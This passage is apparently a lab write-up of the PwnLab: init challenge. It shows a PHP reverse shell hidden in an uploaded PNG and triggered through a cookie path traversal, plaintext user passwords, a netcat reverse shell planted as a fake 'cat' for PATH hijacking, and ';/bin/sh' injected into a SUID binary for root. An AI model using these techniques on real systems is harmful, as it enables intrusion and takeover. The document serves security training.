+systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
+Debian-exim:x:104:109::/var/spool/exim4:/bin/false
+messagebus:x:105:110::/var/run/dbus:/bin/false
+statd:x:106:65534::/var/lib/nfs:/bin/false
+john:x:1000:1000:,,,:/home/john:/bin/bash
+kent:x:1001:1001:,,,:/home/kent:/bin/bash
+mike:x:1002:1002:,,,:/home/mike:/bin/bash
+kane:x:1003:1003:,,,:/home/kane:/bin/bash
+mysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false
+...
+</code></pre></div></div>
+
+<p>We copy the pentestmonkey reverse shell to our current directory, change the IP address and port and attach the reverse shell to an image.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php shell.php
+root@kali:~<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/127.0.0.1/192.168.179.1/;s/1234/443/'</span> shell.php 
+root@kali:~<span class="nv">$ </span><span class="nb">cat </span>shell.php <span class="o">&gt;&gt;</span> tohru.png 
+</code></pre></div></div>
+
+<p>Then we upload the image.</p>
+
+<p><img src="/assets/images/pwnlab/screenshot-5.png" alt="" /></p>
+
+<p>This appears to be a harmless image, but isn’t.</p>
+
+<p><img src="/assets/images/pwnlab/screenshot-6.png" alt="" /></p>
+
+<p>We set up a netcat listener and execute the following curl request.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">--cookie</span> <span class="s1">'lang=../upload/f659f52b072e3f886046f726803ef421.png'</span> 192.168.179.176 <span class="nt">--output</span> out
+</code></pre></div></div>
+
+<p>We have a shell as user www-data and upgrade it to a TTY shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443                
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.176] 36455
+Linux pwnlab 3.16.0-4-686-pae <span class="c">#1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux</span>
+ 10:14:42 up 56 min,  0 <span class="nb">users</span>,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ python -c "import pty; pty.spawn('</span>/bin/bash<span class="s1">')"
+www-data@pwnlab:/$
+</span></code></pre></div></div>
+
+<p>We can use the passwords found previously to access as user kent, but I didn’t find anything.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@pwnlab:/<span class="nv">$ </span>su - kent
+su - kent
+Password: JWzXuBJJNy
+
+kent@pwnlab:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 32
+drwxr-x--- 4 kent kent 4096 Dec 25 11:42 <span class="nb">.</span>
+drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
+<span class="nt">-rw-r--r--</span> 1 kent kent  220 Mar 17  2016 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 kent kent 3515 Mar 17  2016 .bashrc
+drwx------ 2 kent kent 4096 Dec 25 10:47 .gnupg
+<span class="nt">-rw-r--r--</span> 1 kent kent  675 Mar 17  2016 .profile
+drwx------ 2 kent kent 4096 Dec 25 10:39 .ssh
+</code></pre></div></div>
+
+<p>Then I switched to the user kent.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kent@pwnlab:~<span class="nv">$ </span>su - kane
+su - kane
+Password: iSv5Ym2GRo
+
+kane@pwnlab:~<span class="nv">$ </span><span class="nb">ls
+ls
+</span>msgmike
+</code></pre></div></div>
+
+<p>In kane’s home directory there is an executable file, this executes the cat command without the absolute path.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kane@pwnlab:~<span class="nv">$ </span>file msgmike
+file msgmike
+msgmike: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for </span>GNU/Linux 2.6.32, BuildID[sha1]<span class="o">=</span>d7e0b21f33b2134bd17467c3bb9be37deb88b365, not stripped
+
+kane@pwnlab:~<span class="nv">$ </span>./msgmike
+./msgmike
+<span class="nb">cat</span>: /home/mike/msg.txt: No such file or directory
+
+kane@pwnlab:~<span class="nv">$ </span>strings msgmike | <span class="nb">grep cat
+</span>strings msgmike | <span class="nb">grep cat
+cat</span> /home/mike/msg.txt
+</code></pre></div></div>
+
+<p>We will take advantage of this bad practice to escalate the user mike, we first need to export the PATH variable by adding the directory /tmp that will contain our malicious cat command, then we add a netcat reverse shell with the name cat and grant it execute permissions.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kane@pwnlab:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+<span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+kane@pwnlab:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'nc 192.168.179.1 443 -e /bin/bash'</span> <span class="o">&gt;</span> <span class="nb">cat
+echo</span> <span class="s1">'nc 192.168.179.1 443 -e /bin/bash'</span> <span class="o">&gt;</span> <span class="nb">cat
+</span>kane@pwnlab:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x <span class="nb">cat
+chmod</span> +x <span class="nb">cat</span>
+</code></pre></div></div>
+
+<p>We set up a netcat listener and execute the msgmike binary.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kane@pwnlab:/tmp<span class="nv">$ </span>/home/kane/msgmike
+/home/kane/msgmike 
+</code></pre></div></div>
+
+<p>We have a shell as user mike.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.176] 43777
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span>,1003<span class="o">(</span>kane<span class="o">)</span>
+script <span class="nt">-qc</span> /bin/bash /dev/null
+mike@pwnlab:/tmp<span class="err">$</span>
+</code></pre></div></div>
+
+<p>In mike’s home directory there is another binary with the SUID bit enabled, this writes the input provided by the user to a file called messages.txt in the root directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mike@pwnlab:/tmp<span class="nv">$ </span><span class="nb">cd</span> /home/mike
+<span class="nb">cd</span> /home/mike
+mike@pwnlab:/home/mike<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> msg2root
+<span class="nb">ls</span> <span class="nt">-la</span> msg2root
+<span class="nt">-rwsr-sr-x</span> 1 root root 5364 Mar 17  2016 msg2root
+
+mike@pwnlab:/home/mike<span class="nv">$ </span>strings ./msg2root
+strings ./msg2root
+...
+Message <span class="k">for </span>root:                                                                                                                                                   
+/bin/echo %s <span class="o">&gt;&gt;</span> /root/messages.txt
+...
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="suid-binary">SUID Binary</h3>
+
+<p>We can get a root shell by simply entering a semicolon followed by /bin/bash.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mike@pwnlab:/home/mike<span class="nv">$ </span>./msg2root
+./msg2root
+Message <span class="k">for </span>root: <span class="p">;</span>/bin/sh
+<span class="p">;</span>/bin/sh
+
+<span class="c"># id</span>
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1003<span class="o">(</span>kane<span class="o">)</span>
+
+<span class="c"># python -c "import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"</span>
+python <span class="nt">-c</span> <span class="s2">"import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"</span>
+root@pwnlab:/home/mike# <span class="nb">cd</span> /root
+<span class="nb">cd</span> /root
+root@pwnlab:/root# <span class="nb">ls
+ls
+</span>flag.txt  messages.txt
+
+
+root@pwnlab:/root# /bin/cat flag.txt
+/bin/cat flag.txt
+.-<span class="o">=</span>~<span class="o">=</span>-.                                                                 .-<span class="o">=</span>~<span class="o">=</span>-.
+<span class="o">(</span>__  _<span class="o">)</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">(</span>__  _<span class="o">)</span>
+<span class="o">(</span>_ ___<span class="o">)</span>  _____                             _                            <span class="o">(</span>_ ___<span class="o">)</span>
+<span class="o">(</span>__  _<span class="o">)</span> /  __ <span class="se">\ </span>                          | |                           <span class="o">(</span>__  _<span class="o">)</span>
+<span class="o">(</span> _ __<span class="o">)</span> | /  <span class="se">\/</span> ___  _ __   __ _ _ __ __ _| |_ ___                      <span class="o">(</span> _ __<span class="o">)</span>
+<span class="o">(</span>__  _<span class="o">)</span> | |    / _ <span class="se">\|</span> <span class="s1">'_ \ / _` | '</span>__/ _<span class="sb">`</span> | __/ __|                     <span class="o">(</span>__  _<span class="o">)</span>
+<span class="o">(</span>_ ___<span class="o">)</span> | <span class="se">\_</span>_/<span class="se">\ </span><span class="o">(</span>_<span class="o">)</span> | | | | <span class="o">(</span>_| | | | <span class="o">(</span>_| | |_<span class="se">\_</span>_ <span class="se">\ </span>                    <span class="o">(</span>_ ___<span class="o">)</span>
+<span class="o">(</span>__  _<span class="o">)</span>  <span class="se">\_</span>___/<span class="se">\_</span>__/|_| |_|<span class="se">\_</span>_, |_|  <span class="se">\_</span>_,_|<span class="se">\_</span>_|___/                     <span class="o">(</span>__  _<span class="o">)</span>
+<span class="o">(</span> _ __<span class="o">)</span>                     __/ |                                       <span class="o">(</span> _ __<span class="o">)</span>
+<span class="o">(</span>__  _<span class="o">)</span>                    |___/                                        <span class="o">(</span>__  _<span class="o">)</span>
+<span class="o">(</span>__  _<span class="o">)</span>                                                                 <span class="o">(</span>__  _<span class="o">)</span>
+<span class="o">(</span>_ ___<span class="o">)</span> If  you are  reading this,  means  that you have  <span class="nb">break</span> <span class="s1">'init'</span>  <span class="o">(</span>_ ___<span class="o">)</span>
+<span class="o">(</span> _ __<span class="o">)</span> Pwnlab.  I hope  you enjoyed  and thanks  <span class="k">for  </span>your <span class="nb">time </span>doing  <span class="o">(</span> _ __<span class="o">)</span>
+<span class="o">(</span>__  _<span class="o">)</span> this challenge.                                                 <span class="o">(</span>__  _<span class="o">)</span>
+<span class="o">(</span>_ ___<span class="o">)</span>                                                                 <span class="o">(</span>_ ___<span class="o">)</span>
+<span class="o">(</span> _ __<span class="o">)</span> Please send me  your  feedback or your  writeup,  I will  love  <span class="o">(</span> _ __<span class="o">)</span>
+<span class="o">(</span>__  _<span class="o">)</span> reading it                                                      <span class="o">(</span>__  _<span class="o">)</span>
+<span class="o">(</span>__  _<span class="o">)</span>                                                                 <span class="o">(</span>__  _<span class="o">)</span>
+<span class="o">(</span>__  _<span class="o">)</span>                                             For sniferl4bs.com  <span class="o">(</span>__  _<span class="o">)</span>
+<span class="o">(</span> _ __<span class="o">)</span>                                claor@PwnLab.net - @Chronicoder  <span class="o">(</span> _ __<span class="o">)</span>
+<span class="o">(</span>__  _<span class="o">)</span>                                                                 <span class="o">(</span>__  _<span class="o">)</span>
+<span class="o">(</span>_ ___<span class="o">)</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">(</span>_ ___<span class="o">)</span>
+<span class="sb">`</span>-._.-<span class="s1">'                                                                 `-._.-'</span>
+</code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <footer>
+<!--	  <div class="dashed"></div> -->
+    <ul class="horizontal-list">
+  
+</ul>
+
+  </footer>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2022&nbsp;s4rgaz
+          &nbsp;
+		  •
+          &nbsp;<!--Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
+          &nbsp;
+		  •
+          &nbsp;-->
+		  <!--Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>-->
+		  RSS&nbsp; <a href="/feed.xml" target="_blank" rel="noreferrer">Feed</a>
+        </div>
+      </div>
+    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
+</html>
